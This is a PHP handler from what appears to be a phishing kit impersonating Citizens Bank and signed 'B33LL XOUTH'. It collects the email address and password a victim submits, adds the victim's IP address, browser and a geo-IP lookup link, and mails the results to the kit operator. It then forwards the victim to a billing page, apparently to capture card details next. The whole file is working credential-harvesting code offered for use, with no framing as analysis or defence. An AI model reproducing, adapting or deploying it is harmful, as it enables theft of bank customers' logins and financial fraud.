<?php include 'send.php';?>
<?php

$ip = getenv("REMOTE_ADDR");
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------->B33LL XOUTH Citizens Bank - ReZulT (4)<------------------\n";
$message .= "||-------->Email Access<--------||\n";
$message .= "Email: ".$_POST['Email']."\n";
$message .= "Password: ".$_POST['Pass']."\n\n";

$message .= "Time: $timestamp \n";
$message .= "User-Agent: $browser \n";
$message .= "IP Info: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "----------- -By B33LL XOUTH----------\n";

$subject = "Citizens Bank Email (4)😈 INFO FROM 😈- $ip";
$headers = "";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "\n";
	 mail("", "B33LL XOUTH ", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:billing1.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?> 